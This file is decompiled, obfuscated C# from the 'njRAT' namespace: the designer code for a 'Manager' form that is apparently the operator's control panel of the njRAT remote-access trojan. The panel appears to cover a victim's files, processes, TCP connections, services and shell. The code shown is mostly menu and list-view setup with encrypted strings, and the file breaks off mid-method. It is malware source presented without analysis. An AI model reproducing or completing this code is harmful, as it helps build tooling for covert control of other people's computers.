using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace njRAT
{
	// Token: 0x0200003C RID: 60
	[DesignerGenerated]
	public partial class Manager : Form
	{
		// Token: 0x06000244 RID: 580 RVA: 0x0001BDB0 File Offset: 0x00019FB0
		public Manager()
		{
			base.FormClosing += this.\u0002;
			base.Resize += this.\u0006\u2004;
			base.Load += this.\u0002;
			this.RGCH = new Collection();
			this.\u000F\u200B = string.Empty;
			this.Images = new Collection();
			this.Cache = new Collection();
			this.isCut = false;
			this.Flist = string.Empty;
			this.TCPFX = true;
			this.PRFX = true;
			this.SrvFX = true;
			this.srvNxt = true;
			this.PID = 0;
			this.PRNXT = true;
			this.TCPNXT = true;
			this.\u0002\u2000\u2000 = new string[5];
			this.\u0003\u2000\u2000 = 0;
			this.\u0005\u2000\u2000 = 0;
			this.cur = Manager.CR.fm;
			this.shStarted = 0;
			this.\u0002();
		}

		// Token: 0x06000246 RID: 582 RVA: 0x0001BEE4 File Offset: 0x0001A0E4
		[DebuggerStepThrough]
		private void \u0002()
		{
			this.\u0002 = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Manager));
			ListViewItem listViewItem = new ListViewItem(global::\u0006\u2001.\u0002(-1829123430), 3);
			ListViewItem listViewItem2 = new ListViewItem(global::\u0006\u2001.\u0002(-1829123353), 0);
			ListViewItem listViewItem3 = new ListViewItem(global::\u0006\u2001.\u0002(-1829123343), 2);
			ListViewItem listViewItem4 = new ListViewItem(global::\u0006\u2001.\u0002(-1829123361), 1);
			ListViewItem listViewItem5 = new ListViewItem(global::\u0006\u2001.\u0002(-1829123376), 4);
			ListViewItem listViewItem6 = new ListViewItem(global::\u0006\u2001.\u0002(-1829123779), 5);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new StatusStrip());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ToolStripStatusLabel());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ToolStripProgressBar());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new Timer(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ListView());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(new ImageList(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new Panel());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ImageList(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new TreeView());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2003(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2003(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2003(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new Panel());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new RichTextBox());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new TextBox());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new Panel());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2002(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2003(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new ImageList(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new PictureBox());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new TextBox());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(new ContextMenuStrip(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2000(new ToolStripMenuItem());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new ImageList(this.\u0002));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F\u2001(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003\u2000(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005\u2000(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008\u2000(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new \u000F\u2000());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(new ColumnHeader());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E().SuspendLayout();
			((ISupportInitialize)this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()).BeginInit();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().SuspendLayout();
			this.SuspendLayout();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829123826);
			Control control = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			Size size = new Size(164, 70);
			control.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829123835));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829123741);
			ToolStripItem toolStripItem = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(163, 22);
			toolStripItem.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829123769);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829123748));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829123660);
			ToolStripItem toolStripItem2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(163, 22);
			toolStripItem2.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Text = global::\u0006\u2001.\u0002(-1829123694);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829141211));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Name = global::\u0006\u2001.\u0002(-1829141248);
			ToolStripItem toolStripItem3 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			size = new Size(163, 22);
			toolStripItem3.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Text = global::\u0006\u2001.\u0002(-1829123586);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002()
			});
			Control control2 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			Point location = new Point(0, 313);
			control2.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829139389);
			Control control3 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(670, 22);
			control3.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 1;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829139389);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().IsLink = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829130817);
			ToolStripItem toolStripItem4 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(13, 17);
			toolStripItem4.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829129162);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829123640);
			ToolStripControlHost toolStripControlHost = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(100, 16);
			toolStripControlHost.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Interval = 1000;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Activation = ItemActivation.OneClick;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Dock = DockStyle.Top;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().HeaderStyle = ColumnHeaderStyle.None;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().HotTracking = true;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().HoverSelection = true;
			listViewItem.Tag = global::\u0006\u2001.\u0002(-1829123617);
			listViewItem2.Tag = global::\u0006\u2001.\u0002(-1829123299);
			listViewItem3.Tag = global::\u0006\u2001.\u0002(-1829139276);
			listViewItem4.Tag = global::\u0006\u2001.\u0002(-1829137143);
			listViewItem5.Tag = global::\u0006\u2001.\u0002(-1829123625);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.AddRange(new ListViewItem[]
			{
				listViewItem,
				listViewItem2,
				listViewItem3,
				listViewItem4,
				listViewItem5,
				listViewItem6
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().LargeImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			Control control4 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(0, 0);
			control4.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().MultiSelect = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829124049);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Scrollable = false;
			Control control5 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(670, 52);
			control5.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().SmallImageList = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 3;
			ListView listView = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(130, 25);
			listView.TileSize = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().UseCompatibleStateImageBehavior = false;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().View = View.Tile;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ImageStream = (ImageListStreamer)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829124033));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().TransparentColor = Color.Transparent;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(0, global::\u0006\u2001.\u0002(-1829124094));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(1, global::\u0006\u2001.\u0002(-1829123985));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(2, global::\u0006\u2001.\u0002(-1829123972));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(3, global::\u0006\u2001.\u0002(-1829124022));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(4, global::\u0006\u2001.\u0002(-1829124008));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Images.SetKeyName(5, global::\u0006\u2001.\u0002(-1829123931));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().BackColor = Color.Black;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().Name = global::\u0006\u2001.\u0002(-1829141617);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003().RenderMode = ToolStripRenderMode.System;
			Control control6 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0003();
			size = new Size(157, 26);
			control6.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Font = new Font(global::\u0006\u2001.\u0002(-1829139509), 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().ForeColor = Color.LightSteelBlue;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Image = (Image)componentResourceManager.GetObject(global::\u0006\u2001.\u0002(-1829123913));
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Name = global::\u0006\u2001.\u0002(-1829123861);
			ToolStripItem toolStripItem5 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008();
			size = new Size(156, 22);
			toolStripItem5.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0008().Text = global::\u0006\u2001.\u0002(-1829123899);
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E());
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Controls.Add(this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002());
			Control control7 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			location = new Point(70, 37);
			control7.Location = location;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Name = global::\u0006\u2001.\u0002(-1829128623);
			Control control8 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
			size = new Size(433, 238);
			control8.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().TabIndex = 6;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.AddRange(new ToolStripItem[]
			{
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000E(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u000F(),
				this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002\u2000()
			});
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Name = global::\u0006\u2001.\u0002(-1829122257);
			Control control9 = this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005();
			size = new Size(132, 92);
			control9.Size = size;
			this.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0006().BackColor = Color.Black;
